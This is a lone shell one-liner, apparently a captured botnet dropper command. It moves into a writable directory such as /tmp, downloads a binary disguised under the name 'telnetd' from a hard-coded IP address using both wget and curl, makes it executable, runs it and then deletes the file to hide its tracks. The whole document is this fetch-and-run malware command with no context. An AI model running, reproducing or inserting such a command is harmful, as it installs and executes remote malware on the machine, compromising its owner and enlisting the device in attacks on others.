cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.67.220.112/telnetd; curl -O http://194.67.220.112/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
